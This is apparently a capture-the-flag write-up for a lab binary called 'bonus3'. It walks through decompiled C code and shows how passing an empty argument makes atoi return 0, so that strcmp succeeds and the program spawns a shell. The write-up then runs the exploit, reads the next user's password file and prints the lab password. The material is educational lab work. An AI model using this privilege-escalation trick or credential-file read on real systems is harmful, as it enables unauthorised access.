# Bonus3

We have an executable file that, when called with ``argv[1]``, writes something.

```
$ ls
bonus3
$ ./bonus3
$ ./bonus3 test

$
```

Here is an overview of the code. via dogbolt.
</br>
<<https://dogbolt.org>>

```
unsigned int main(unsigned int a0, struct_0 *a1)
{
    unsigned int *cur;  // edi
    unsigned int flag1;  // ecx
    char v0;  // [bp-0x94]
    char result;  // [bp-0x53]
    char v2;  // [bp-0x52]
    FILE *fp;  // [bp-0x10]

    fp = fopen("/home/user/end/.pass", "r");
    cur = &v0;
    for (flag1 = 33; flag1; cur += 1)
    {
        flag1 -= 1;
        *(cur) = 0;
    }
    if (fp && a0 == 2)
    {
        fread(&v0, 1, 66, fp);
        result = 0;
        (&v0)[atoi(a1->field_4)] = 0;
        fread(&v2, 1, 65, fp);
        fclose(fp);
        if (!strcmp(&v0, a1->field_4))
            execl("/bin/sh", "sh");
        else
            puts(&v2);
        return 0;
    }
    return 4294967295;
}
```

We can see that if ``!strcmp(&v0, a1->field_4)`` we win.
</br>
And with ``(&v0)[atoi(a1->field_4)] = 0;``
</br>
We put the index given by atoi(a1->field_4) ``'\0'``.
</br>
If you put ``""`` in atoi, it will give 0.
</br>
So the v0 channel would be empty.
</br>
And we end up with ``!strcmp("", "")``

```
...
(&v0)[atoi(a1->field_4)] = 0;
...
if (!strcmp(&v0, a1->field_4))
    execl("/bin/sh", "sh");
...
```

Hop!

```
$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
